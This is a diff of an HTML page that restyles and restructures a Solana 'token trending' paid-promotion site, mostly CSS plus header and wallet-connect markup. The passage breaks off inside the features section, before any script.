@@ -3,1811 +3,812 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Soltrending - Premium Marketing Solutions</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <title>SolTrend - Token Trending Service</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
+        :root {
+            --primary: #9945FF;
+            --secondary: #14F195;
+            --dark-bg: #121212;
+            --dark-card: #1e1e1e;
+            --dark-text: #ffffff;
+            --light-bg: #f5f5f5;
+            --light-card: #ffffff;
+            --light-text: #333333;
+            --border-radius: 8px;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        :root {
-            /* Professional Color Scheme */
-            --primary-dark: #0f1419;
-            --primary-medium: #1a202c;
-            --primary-light: #2d3748;
-            --accent-blue: #3182ce;
-            --accent-teal: #319795;
-            --text-primary: #f7fafc;
-            --text-secondary: #cbd5e0;
-            --text-muted: #a0aec0;
-            --border-color: #4a5568;
-            --success: #38a169;
-            --warning: #d69e2e;
-            --error: #e53e3e;
-            --card-bg: rgba(45, 55, 72, 0.8);
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --shadow: rgba(0, 0, 0, 0.25);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary-medium) 100%);
-            color: var(--text-primary);
-            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--dark-text);
             line-height: 1.6;
+            transition: background-color 0.3s, color 0.3s;
         }
 
-        /* Header */
-        .header {
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            background: rgba(15, 20, 25, 0.95);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border-color);
+        body.light-mode {
+            background-color: var(--light-bg);
+            color: var(--light-text);
         }
 
-        .nav-container {
+        .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 0 24px;
+            padding: 0 20px;
+        }
+
+        header {
+            background-color: rgba(30, 30, 30, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(153, 69, 255, 0.2);
+        }
+
+        header .container {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            height: 80px;
+            align-items: center;
         }
 
-        .logo {
-            font-size: 28px;
-            font-weight: 800;
-            color: var(--accent-blue);
-            text-decoration: none;
-            letter-spacing: -0.02em;
-        }
-
-        .nav-actions {
+        header h1 {
+            color: var(--primary);
+            font-size: 2rem;
             display: flex;
             align-items: center;
-            gap: 24px;
+            gap: 10px;
         }
 
-        .support-link {
+        header h1 span {
+            color: var(--secondary);
+        }
+
+        .wallet-section {
             display: flex;
             align-items: center;
-            gap: 8px;
-            color: var(--text-secondary);
-            text-decoration: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            transition: all 0.2s ease;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .support-link:hover {
-            background: var(--glass-bg);
-            color: var(--text-primary);
+            gap: 15px;
         }
 
         .wallet-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 8px 16px;
-            background: var(--card-bg);
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            font-size: 14px;
-        }
-
-        .connect-wallet {
-            background: linear-gradient(135deg, var(--accent-blue), var(--accent-teal));
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .connect-wallet:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.4);
-        }
-
-        /* Main Container */
-        .main-container {
-            max-width: 800px;
-            margin: 40px auto;
-            padding: 0 24px;
-        }
-
-        .card {
-            background: var(--card-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 48px;
-            box-shadow: 0 8px 32px var(--shadow);
-        }
-
-        /* Progress Indicator */
-        .progress-container {
-            margin-bottom: 48px;
-        }
-
-        .progress-steps {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: relative;
-            margin-bottom: 24px;
-        }
-
-        .progress-line {
-            position: absolute;
-            top: 20px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: var(--border-color);
-            z-index: 1;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--accent-blue), var(--accent-teal));
-            transition: width 0.5s ease;
-            border-radius: 1px;
-        }
-
-        .step-indicator {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: var(--primary-light);
-            border: 2px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 14px;
-            position: relative;
-            z-index: 2;
-            transition: all 0.3s ease;
-        }
-
-        .step-indicator.active {
-            background: var(--accent-blue);
-            border-color: var(--accent-blue);
-            color: white;
-        }
-
-        .step-indicator.completed {
-            background: var(--success);
-            border-color: var(--success);
-            color: white;
-        }
-
-        .step-labels {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 12px;
-        }
-
-        .step-label {
-            font-size: 12px;
-            color: var(--text-muted);
-            font-weight: 500;
-            text-align: center;
-            flex: 1;
-        }
-
-        .step-label.active {
-            color: var(--accent-blue);
-            font-weight: 600;
-        }
-
-        /* Form Sections */
-        .step-content {
+            background-color: var(--dark-card);
+            padding: 10px 15px;
+            border-radius: var(--border-radius);
+            font-size: 0.9rem;
             display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .step-content.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .section-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--text-primary);
-            margin-bottom: 8px;
-            letter-spacing: -0.01em;
-        }
-
-        .section-subtitle {
-            color: var(--text-secondary);
-            margin-bottom: 32px;
-            font-size: 16px;
-        }
-
-        .form-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 24px;
-            margin-bottom: 32px;
-        }
-
-        .form-group {
-            margin-bottom: 24px;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--text-primary);
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 16px;
-            background: var(--primary-light);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 16px;
-            transition: all 0.2s ease;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.1);
-        }
-
-        .form-input::placeholder {
-            color: var(--text-muted);
-        }
-
-        textarea.form-input {
-            min-height: 120px;
-            resize: vertical;
-        }
-
-        /* Package Selection */
-        .package-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 24px;
-            margin: 32px 0;
-        }
-
-        .package-category {
-            background: var(--primary-light);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            padding: 32px 24px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .package-category:hover {
-            border-color: var(--accent-blue);
-            transform: translateY(-2px);
-        }
-
-        .package-category.selected {
-            border-color: var(--accent-blue);
-            background: rgba(49, 130, 206, 0.1);
-        }
-
-        .package-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-primary);
-        }
-
-        .package-description {
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-
-        .package-recommended {
-            position: absolute;
-            top: -8px;
-            right: 16px;
-            background: var(--accent-teal);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .pricing-list {
-            display: none;
-            margin-top: 32px;
-        }
-
-        .pricing-list.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .pricing-item {
-            display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 20px 24px;
-            background: var(--primary-light);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
+            gap: 10px;
         }
 
-        .pricing-item:hover {
-            border-color: var(--accent-blue);
-            background: rgba(49, 130, 206, 0.05);
+        body.light-mode .wallet-info {
+            background-color: var(--light-card);
+            box-shadow: var(--shadow);
         }
 
-        .pricing-item.selected {
-            border-color: var(--accent-blue);
-            background: rgba(49, 130, 206, 0.1);
-        }
-
-        .pricing-duration {
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        .pricing-cost {
-            font-weight: 700;
-            color: var(--accent-blue);
-            font-size: 18px;
-        }
-
-        /* Payment Section */
-        .payment-card {
-            background: var(--primary-light);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 32px;
-            margin: 32px 0;
-            text-align: center;
-        }
-
-        .wallet-address-container {
-            background: var(--primary-dark);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            margin: 24px 0;
-            position: relative;
-        }
-
-        .wallet-address {
-            font-family: 'JetBrains Mono', 'SF Mono', monospace;
-            font-size: 14px;
-            color: var(--text-primary);
-            word-break: break-all;
-            line-height: 1.5;
-        }
-
-        .copy-button {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            background: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .copy-button:hover {
-            background: var(--accent-teal);
-        }
-
-        .payment-instructions {
-            background: rgba(49, 130, 206, 0.1);
-            border: 1px solid var(--accent-blue);
-            border-radius: 8px;
-            padding: 24px;
-            margin: 24px 0;
-        }
-
-        .instruction-title {
-            font-weight: 600;
-            color: var(--accent-blue);
-            margin-bottom: 12px;
-        }
-
-        .instruction-list {
-            list-style: none;
-            padding: 0;
-        }
-
-        .instruction-list li {
-            margin-bottom: 8px;
-            padding-left: 24px;
-            position: relative;
-            color: var(--text-secondary);
-        }
-
-        .instruction-list li::before {
-            content: counter(step-counter);
-            counter-increment: step-counter;
-            position: absolute;
-            left: 0;
-            background: var(--accent-blue);
-            color: white;
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
+        .wallet-info.show {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            font-weight: 600;
-        }
-
-        .instruction-list {
-            counter-reset: step-counter;
-        }
-
-        /* Alerts */
-        .alert {
-            padding: 16px 20px;
-            border-radius: 8px;
-            margin: 24px 0;
-            border-left: 4px solid;
-        }
-
-        .alert-success {
-            background: rgba(56, 161, 105, 0.1);
-            border-color: var(--success);
-            color: var(--success);
-        }
-
-        .alert-error {
-            background: rgba(229, 62, 62, 0.1);
-            border-color: var(--error);
-            color: var(--error);
-        }
-
-        .alert-info {
-            background: rgba(49, 130, 206, 0.1);
-            border-color: var(--accent-blue);
-            color: var(--accent-blue);
-        }
-
-        /* Buttons */
-        .button-group {
-            display: flex;
-            gap: 16px;
-            justify-content: center;
-            margin-top: 32px;
         }
 
         .btn {
-            padding: 14px 28px;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 14px;
+            background-color: transparent;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+            padding: 10px 20px;
+            border-radius: var(--border-radius);
             cursor: pointer;
-            transition: all 0.2s ease;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn:hover {
+            background-color: var(--primary);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .btn.primary {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .btn.primary:hover {
+            background-color: #7d3ad9;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 60px 0;
+            background: linear-gradient(135deg, rgba(153, 69, 255, 0.1) 0%, rgba(20, 241, 149, 0.1) 100%);
+            margin-bottom: 40px;
+            border-radius: var(--border-radius);
+        }
+
+        .hero h2 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--secondary);
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            opacity: 0.9;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .feature-card {
+            background-color: var(--dark-card);
+            padding: 25px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            transition: transform 0.3s ease;
+        }
+
+        body.light-mode .feature-card {
+            background-color: var(--light-card);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-card h3 {
+            color: var(--primary);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .feature-card p {
+            opacity: 0.8;
+        }
+
+        .token-form, .payment-section, .confirmation-section {
+            background-color: var(--dark-card);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            margin: 30px 0;
+            box-shadow: var(--shadow);
+            max-width: 800px;
+            margin: 30px auto;
+        }
+
+        body.light-mode .token-form,
+        body.light-mode .payment-section,
+        body.light-mode .confirmation-section {
+            background-color: var(--light-card);
+        }
+
+        .token-form h3, .payment-section h3, .confirmation-section h3 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: var(--border-radius);
+            border: 1px solid #444;
+            background-color: #2a2a2a;
+            color: white;
+            font-size: 1rem;
+        }
+
+        body.light-mode .form-group input,
+        body.light-mode .form-group select {
+            background-color: #f0f0f0;
+            border: 1px solid #ddd;
+            color: #333;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .radio-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            padding: 12px 20px;
+            border: 1px solid #444;
+            border-radius: var(--border-radius);
+            transition: all 0.3s ease;
+        }
+
+        body.light-mode .radio-label {
+            border: 1px solid #ddd;
+        }
+
+        .radio-label:hover {
+            border-color: var(--primary);
+        }
+
+        .radio-label input {
+            width: auto;
+        }
+
+        .price-display {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--secondary);
+            padding: 10px 0;
+            text-align: center;
+            background: rgba(20, 241, 149, 0.1);
+            border-radius: var(--border-radius);
+            margin: 15px 0;
+        }
+
+        .payment-details {
+            text-align: center;
+        }
+
+        .payment-details p {
+            margin: 15px 0;
+            font-size: 1.1rem;
+        }
+
+        .payment-details strong {
+            color: var(--secondary);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .confirmation-section {
+            text-align: center;
+        }
+
+        .confirmation-section h3 {
+            color: var(--secondary);
+        }
+
+        .confirmation-section p {
+            margin: 15px 0;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 50px;
+            border-top: 1px solid #333;
+            opacity: 0.7;
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            header .container {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .hero h2 {
+                font-size: 2rem;
+            }
+            
+            .radio-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .features {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Theme toggle button */
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--dark-card);
             border: none;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            box-shadow: var(--shadow);
         }
 
-        .btn-primary {
-            background: linear-gradient(135deg, var(--accent-blue), var(--accent-teal));
+        body.light-mode .theme-toggle {
+            background: var(--light-card);
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: var(--primary);
             color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            z-index: 1000;
+            transform: translateX(200%);
+            transition: transform 0.3s ease;
         }
 
-        .btn-primary:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.4);
+        .notification.show {
+            transform: translateX(0);
         }
 
-        .btn-secondary {
-            background: var(--primary-light);
-            color: var(--text-secondary);
-            border: 1px solid var(--border-color);
-        }
-
-        .btn-secondary:hover {
-            background: var(--border-color);
-            color: var(--text-primary);
-        }
-
-        .btn-success {
-            background: var(--success);
-            color: white;
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-
-        /* Loading Spinner */
-        .spinner {
+        .loading {
+            display: inline-block;
             width: 20px;
             height: 20px;
-            border: 2px solid var(--border-color);
-            border-top: 2px solid var(--accent-blue);
+            border: 3px solid rgba(255,255,255,.3);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-right: 8px;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
 
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
+        .price-table {
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(8px);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
+            border-collapse: collapse;
+            margin: 20px 0;
         }
 
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: var(--card-bg);
-            border-radius: 16px;
-            padding: 32px;
-            max-width: 480px;
-            width: 90%;
-            border: 1px solid var(--border-color);
-            text-align: center;
-        }
-
-        .modal-title {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 16px;
-            color: var(--text-primary);
-        }
-
-        .modal-text {
-            color: var(--text-secondary);
-            margin-bottom: 24px;
-        }
-
-        .wallet-options {
-            display: grid;
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-
-        .wallet-option {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 16px;
-            background: var(--primary-light);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.2s ease;
+        .price-table th {
+            background-color: rgba(153, 69, 255, 0.2);
+            padding: 12px;
             text-align: left;
         }
 
-        .wallet-option:hover {
-            border-color: var(--accent-blue);
-            background: rgba(49, 130, 206, 0.05);
+        .price-table td {
+            padding: 12px;
+            border-bottom: 1px solid #444;
         }
 
-        .wallet-icon {
-            width: 32px;
-            height: 32px;
+        body.light-mode .price-table td {
+            border-bottom: 1px solid #ddd;
+        }
+
+        .price-table tr:hover {
+            background-color: rgba(153, 69, 255, 0.05);
+        }
+
+        .sol-icon {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
             border-radius: 50%;
-            background: var(--accent-blue);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 600;
-        }
-
-        /* User Info */
-        .user-info {
-            text-align: center;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 8px;
-            margin-bottom: 32px;
-            font-size: 14px;
-            color: var(--text-muted);
-        }
-
-        /* Liquid Ripple Animation */
-        .ripple {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(49, 130, 206, 0.4);
-            transform: scale(0);
-            animation: ripple-effect 0.6s linear;
-            pointer-events: none;
-        }
-
-        @keyframes ripple-effect {
-            to {
-                transform: scale(4);
-                opacity: 0;
-            }
-        }
-
-        .ripple-container {
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Enhanced Touch Interactions */
-        .btn, .form-input, .pricing-item, .package-category, .wallet-option {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn:active, .pricing-item:active, .package-category:active, .wallet-option:active {
-            transform: scale(0.98);
-        }
-
-        /* Floating Action Animations */
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .connect-wallet {
-            animation: float 3s ease-in-out infinite;
-        }
-
-        .connect-wallet:hover {
-            animation: none;
-        }
-
-        /* Progress Animation */
-        .progress-fill {
-            background: linear-gradient(90deg, var(--accent-blue), var(--accent-teal), var(--accent-blue));
-            background-size: 200% 100%;
-            animation: gradient-shift 3s ease infinite;
-        }
-
-        @keyframes gradient-shift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* Card Entrance Animations */
-        .card {
-            animation: slideInUp 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-        }
-
-        @keyframes slideInUp {
-            from {
-                opacity: 0;
-                transform: translateY(60px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Stagger Animation for Form Groups */
-        .form-group {
-            animation: slideInLeft 0.6s ease-out;
-        }
-
-        .form-group:nth-child(2) { animation-delay: 0.1s; }
-        .form-group:nth-child(3) { animation-delay: 0.2s; }
-        .form-group:nth-child(4) { animation-delay: 0.3s; }
-
-        @keyframes slideInLeft {
-            from {
-                opacity: 0;
-                transform: translateX(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        /* Pricing Items Animation */
-        .pricing-item {
-            animation: slideInRight 0.5s ease-out;
-        }
-
-        .pricing-item:nth-child(2) { animation-delay: 0.1s; }
-        .pricing-item:nth-child(3) { animation-delay: 0.2s; }
-        .pricing-item:nth-child(4) { animation-delay: 0.3s; }
-        .pricing-item:nth-child(5) { animation-delay: 0.4s; }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        /* Pulse Animation for Active Elements */
-        .step-indicator.active {
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(49, 130, 206, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(49, 130, 206, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(49, 130, 206, 0); }
-        }
-
-        /* Loading Spinner Enhanced */
-        .spinner {
-            animation: spin 1s linear infinite, pulse-glow 2s ease-in-out infinite alternate;
-        }
-
-        @keyframes pulse-glow {
-            from { filter: drop-shadow(0 0 5px var(--accent-blue)); }
-            to { filter: drop-shadow(0 0 15px var(--accent-blue)); }
-        }
-
-        /* Touch Feedback */
-        @media (hover: none) and (pointer: coarse) {
-            .btn:active {
-                background: linear-gradient(135deg, #2c6cb0, #2a7a78);
-            }
-            
-            .form-input:focus {
-                transform: scale(1.02);
-            }
-            
-            .pricing-item:active, .package-category:active {
-                transform: scale(0.98);
-                background: rgba(49, 130, 206, 0.2);
-            }
-        }
-
-        /* Responsive Design - Mobile First */
-        @media (max-width: 480px) {
-            .nav-container {
-                padding: 0 12px;
-                height: 70px;
-                flex-wrap: wrap;
-                gap: 8px;
-            }
-
-            .logo {
-                font-size: 22px;
-            }
-
-            .nav-actions {
-                gap: 8px;
-                flex-wrap: wrap;
-            }
-
-            .support-link {
-                padding: 6px 10px;
-                font-size: 12px;
-            }
-
-            .wallet-info {
-                padding: 6px 12px;
-                font-size: 12px;
-            }
-
-            .connect-wallet {
-                padding: 8px 16px;
-                font-size: 12px;
-            }
-
-            .main-container {
-                padding: 0 12px;
-                margin: 20px auto;
-            }
-
-            .card {
-                padding: 20px;
-            }
-
-            .section-title {
-                font-size: 20px;
-            }
-
-            .section-subtitle {
-                font-size: 14px;
-            }
-
-            .form-grid {
-                grid-template-columns: 1fr;
-                gap: 16px;
-            }
-
-            .form-input {
-                padding: 14px;
-                font-size: 16px; /* Prevent zoom on iOS */
-            }
-
-            .package-grid {
-                grid-template-columns: 1fr;
-                gap: 16px;
-            }
-
-            .package-category {
-                padding: 24px 20px;
-            }
-
-            .pricing-item {
-                padding: 16px 20px;
-            }
-
-            .button-group {
-                flex-direction: column;
-                gap: 12px;
-            }
-
-            .btn {
-                width: 100%;
-                padding: 16px;
-                font-size: 14px;
-            }
-
-            .step-labels {
-                font-size: 10px;
-            }
-
-            .step-indicator {
-                width: 32px;
-                height: 32px;
-                font-size: 12px;
-            }
-
-            .progress-steps {
-                margin: 0 16px 20px 16px;
-            }
-
-            .modal-content {
-                padding: 24px;
-                margin: 5% auto;
-            }
-
-            .wallet-option {
-                padding: 12px;
-            }
-
-            .wallet-address {
-                font-size: 12px;
-            }
-
-            .copy-button {
-                padding: 6px 10px;
-                font-size: 10px;
-            }
-        }
-
-        @media (max-width: 768px) and (min-width: 481px) {
-            .nav-container {
-                padding: 0 16px;
-            }
-
-            .main-container {
-                padding: 0 16px;
-            }
-
-            .card {
-                padding: 32px 24px;
-            }
-
-            .form-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .package-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .button-group {
-                flex-direction: row;
-                justify-content: center;
-            }
-
-            .nav-actions {
-                gap: 12px;
-            }
-
-            .support-link {
-                padding: 8px 12px;
-                font-size: 13px;
-            }
-
-            .step-labels {
-                font-size: 11px;
-            }
-        }
-
-        @media (max-width: 1024px) and (min-width: 769px) {
-            .main-container {
-                padding: 0 20px;
-            }
-
-            .card {
-                padding: 40px;
-            }
-        }
-
-        /* Landscape Mobile */
-        @media (max-height: 500px) and (orientation: landscape) {
-            .header {
-                position: relative;
-            }
-
-            .nav-container {
-                height: 60px;
-            }
-
-            .main-container {
-                margin: 20px auto;
-            }
-
-            .card {
-                padding: 20px;
-            }
-
-            .section-title {
-                font-size: 18px;
-                margin-bottom: 16px;
-            }
-
-            .progress-container {
-                margin-bottom: 24px;
-            }
+            margin-right: 5px;
+            vertical-align: middle;
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header class="header">
-        <nav class="nav-container">
-            <a href="#" class="logo">Soltrending</a>
-            <div class="nav-actions">
-                <a href="https://t.me/Pump_SupportTeam" target="_blank" class="support-link">
-                    <i class="fab fa-telegram"></i>
-                    Support
-                </a>
-                <div class="wallet-info" id="walletInfo">
-                    <i class="fas fa-wallet"></i>
-                    <span id="balanceDisplay">0 SOL</span>
-                </div>
-                <button class="connect-wallet" id="connectBtn" onclick="connectWallet()">
+    <button class="theme-toggle" id="themeToggle">🌙</button>
+    
+    <div class="notification" id="notification">
+        Payment successful! Notification sent to developer.
+    </div>
+
+    <header>
+        <div class="container">
+            <h1>Sol<span>Trend</span></h1>
+            <div class="wallet-section">
+                <button id="connectWallet" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2zm13 2.383-4.758 2.855L15 11.114v-5.73zm-.034 6.878L9.271 8.82 8 9.583 6.728 8.82l-5.694 3.44A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.739zM1 11.114l4.758-2.876L1 5.383v5.73z"/>
+                    </svg>
                     Connect Wallet
                 </button>
+                <div id="walletInfo" class="wallet-info">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M0 4s0-2 2-2h12s2 0 2 2v6s0 2-2 2H2s-2 0-2-2V4zm2-1a1 1 0 0 0-1 1v1h14V4a1 1 0 0 0-1-1H2zm13 4H1v5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V7z"/>
+                        <path d="M8 8.5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-1 0V9a.5.5 0 0 1 .5-.5z"/>
+                    </svg>
+                    <span id="balance">Balance: -- SOL</span>
+                </div>
             </div>
-        </nav>
+        </div>
     </header>
 
-    <!-- Main Content -->
-    <main class="main-container">
-        <div class="card">
-            <!-- User Info -->
-            <div class="user-info" id="userInfo">
-                Loading location...
-            </div>
+    <main class="container">
+        <section class="hero">
+            <h2>Boost Your Token to Trending Lists</h2>
+            <p>Get your Solana token featured on top trending lists with our professional service. Reach more investors and increase visibility for your project.</p>
+            <button class="btn primary" id="getStarted">Get Started</button>
+        </section>
 
-            <!-- Connected Wallet Display -->
-            <div class="alert alert-success" id="connectedWallet" style="display: none;">
-                <i class="fas fa-check-circle"></i>
-                <strong>Wallet Connected:</strong>
-                <span id="connectedAddress" style="font-family: monospace;"></span>
+        <section class="features">
+            <div class="feature-card">
+                <h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                        <path d="M80 0 16 16">
